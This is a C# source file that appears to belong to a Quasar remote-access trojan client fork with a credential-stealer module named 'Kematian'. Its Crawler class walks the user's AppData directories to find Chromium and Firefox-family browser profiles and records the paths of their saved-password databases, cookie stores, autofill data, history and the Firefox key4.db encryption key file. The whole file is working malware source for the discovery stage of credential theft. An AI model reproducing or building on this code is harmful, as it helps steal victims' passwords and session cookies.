using Quasar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Quasar.Client.Kematian.Browsers.Helpers
{
    public class Crawler
    {
        private const int MAX_DEPTH = 3;
        private static readonly string[] profileNames = { "Default", "Profile" };

        public List<ChromiumBrowserPath> GetChromiumBrowsers()
        {
            var browsers = new ConcurrentBag<ChromiumBrowserPath>();
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] rootDirs = { localAppData, appData };

            Parallel.ForEach(rootDirs, rootDir =>
            {
                if (Directory.Exists(rootDir))
                {
                    SearchForChromiumBrowsers(rootDir, browsers, 0);
                }
            });

            //print all browsers
            foreach (var browser in browsers)
            {
                Debug.WriteLine(browser.ProfilePath);
                foreach (var profile in browser.Profiles)
                {
                    Debug.WriteLine(profile.Name);
                    Debug.WriteLine(profile.WebData);
                    Debug.WriteLine(profile.Cookies);
                    Debug.WriteLine(profile.History);
                    Debug.WriteLine(profile.LoginData);
                    Debug.WriteLine(profile.Bookmarks);
                }
            }

            return browsers.ToList();
        }

        private void SearchForChromiumBrowsers(string directory, ConcurrentBag<ChromiumBrowserPath> browsers, int depth)
        {
            if (depth > MAX_DEPTH) return;

            try
            {
                // Check if current directory contains a Chromium browser
                string userDataPath = Path.Combine(directory, "User Data");
                if (Directory.Exists(userDataPath))
                {
                    string localStatePath = Path.Combine(userDataPath, "Local State");
                    if (File.Exists(localStatePath))
                    {
                        var profiles = FindChromiumProfiles(userDataPath, profileNames);
                        if (profiles.Length > 0)
                        {
                            var browser = new ChromiumBrowserPath
                            {
                                LocalStatePath = localStatePath,
                                ProfilePath = userDataPath,
                                Profiles = profiles
                            };

                            browsers.Add(browser);
                        }
                    }
                }

                // Search subdirectories in parallel
                try
                {
                    var subDirs = Directory.GetDirectories(directory);
                    Parallel.ForEach(subDirs, subDir =>
                    {
                        SearchForChromiumBrowsers(subDir, browsers, depth + 1);
                    });
                }
                catch (UnauthorizedAccessException)
                {
                    // Skip directories we don't have access to
                }
                catch (PathTooLongException)
                {
                    // Skip paths that are too long
                }
            }
            catch (Exception)
            {
                // Skip directories with errors
                return;
            }
        }

        private ChromiumProfile[] FindChromiumProfiles(string basePath, string[] profileNames)
        {
            var profiles = new List<ChromiumProfile>();
            if (!Directory.Exists(basePath)) return profiles.ToArray();

            try
            {
                // Check for Default profile
                string defaultProfilePath = Path.Combine(basePath, "Default");
                if (Directory.Exists(defaultProfilePath))
                {
                    TryAddChromiumProfile(profiles, defaultProfilePath, "Default");
                }

                // Check for Profile X directories
                var profileDirs = Directory.GetDirectories(basePath)
                    .Where(dir => Path.GetFileName(dir).StartsWith("Profile ", StringComparison.OrdinalIgnoreCase))
                    .ToList();

                foreach (var profileDir in profileDirs)
                {
                    Debug.WriteLine("--------------------");
                    Debug.WriteLine(profileDir);
                    Debug.WriteLine("--------------------");
                    TryAddChromiumProfile(profiles, profileDir, Path.GetFileName(profileDir));
                }
            }
            catch (Exception)
            {
                // Handle any exceptions
            }

            return profiles.ToArray();
        }

        private void TryAddChromiumProfile(List<ChromiumProfile> profiles, string profileDir, string profileName)
        {
            var profile = new ChromiumProfile
            {
                Name = profileName,
                WebData = Path.Combine(profileDir, "Web Data"),
                Cookies = Path.Combine(profileDir, "Network", "Cookies"),
                History = Path.Combine(profileDir, "History"),
                LoginData = Path.Combine(profileDir, "Login Data"),
                Bookmarks = Path.Combine(profileDir, "Bookmarks")
            };

            bool webDataExists = File.Exists(profile.WebData);
            bool cookiesExists = File.Exists(profile.Cookies);
            bool historyExists = File.Exists(profile.History);
            bool loginDataExists = File.Exists(profile.LoginData);
            bool bookmarksExists = File.Exists(profile.Bookmarks);

            if (webDataExists && cookiesExists && historyExists && loginDataExists || bookmarksExists)
            {
                if (!profileDir.Contains("Application Data"))
                {
                    profiles.Add(profile);
                }
            }
            else
            {
                if (!webDataExists) Debug.WriteLine($"Missing: {profile.WebData}");
                if (!cookiesExists) Debug.WriteLine($"Missing: {profile.Cookies}");
                if (!historyExists) Debug.WriteLine($"Missing: {profile.History}");
                if (!loginDataExists) Debug.WriteLine($"Missing: {profile.LoginData}");
                if (!bookmarksExists) Debug.WriteLine($"Missing: {profile.Bookmarks}");
            }
        }

        public List<GeckoBrowserPath> GetGeckoBrowsers()
        {
            var browsers = new ConcurrentBag<GeckoBrowserPath>();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // Search for Firefox profiles with depth-limited approach
            SearchForGeckoBrowsers(appData, browsers, 0);

            return browsers.ToList();
        }

        private void SearchForGeckoBrowsers(string directory, ConcurrentBag<GeckoBrowserPath> browsers, int depth)
        {
            if (depth > MAX_DEPTH) return;

            try
            {
                // Check if current directory is a Firefox profile
                string directoryName = Path.GetFileName(directory);
                if (directoryName.Contains(".default-"))
                {
                    var profiles = FindGeckoProfiles(directory);
                    if (profiles.Length > 0)
                    {
                        var browser = new GeckoBrowserPath
                        {
                            ProfilesPath = directory,
                            Profiles = profiles
                        };

                        browsers.Add(browser);
                    }
                }

                // Also check for Firefox "Profiles" directory
                string profilesDir = Path.Combine(directory, "Profiles");
                if (Directory.Exists(profilesDir))
                {
                    try
                    {
                        var profileDirs = Directory.GetDirectories(profilesDir)
                            .Where(dir => Path.GetFileName(dir).Contains(".default-"));

                        foreach (var profileDir in profileDirs)
                        {
                            var profiles = FindGeckoProfiles(profileDir);
                            if (profiles.Length > 0)
                            {
                                var browser = new GeckoBrowserPath
                                {
                                    ProfilesPath = profileDir,
                                    Profiles = profiles
                                };

                                browsers.Add(browser);
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Skip errors in profiles directory
                    }
                }

                // Search subdirectories
                try
                {
                    var subDirs = Directory.GetDirectories(directory);
                    Parallel.ForEach(subDirs, subDir =>
                    {
                        SearchForGeckoBrowsers(subDir, browsers, depth + 1);
                    });
                }
                catch (UnauthorizedAccessException)
                {
                    // Skip directories we don't have access to
                }
                catch (PathTooLongException)
                {
                    // Skip paths that are too long
                }
            }
            catch (Exception)
            {
                // Skip directories with errors
                return;
            }
        }

        private GeckoProfile[] FindGeckoProfiles(string basePath)
        {
            var profiles = new List<GeckoProfile>();

            try
            {
                var profile = new GeckoProfile
                {
                    Name = Path.GetFileName(basePath),
                    Path = basePath,
                    Key4DB = Path.Combine(basePath, "key4.db"),
                    LoginsJson = Path.Combine(basePath, "logins.json"),
                    Cookies = Path.Combine(basePath, "cookies.sqlite"),
                    History = Path.Combine(basePath, "places.sqlite")
                };

                if (File.Exists(profile.Key4DB) &&
                    File.Exists(profile.LoginsJson) &&
                    File.Exists(profile.Cookies) &&
                    File.Exists(profile.History))
                {
                    profiles.Add(profile);
                }
            }
            catch (Exception)
            {
                // Handle any exceptions
            }

            return profiles.ToArray();
        }
    }
}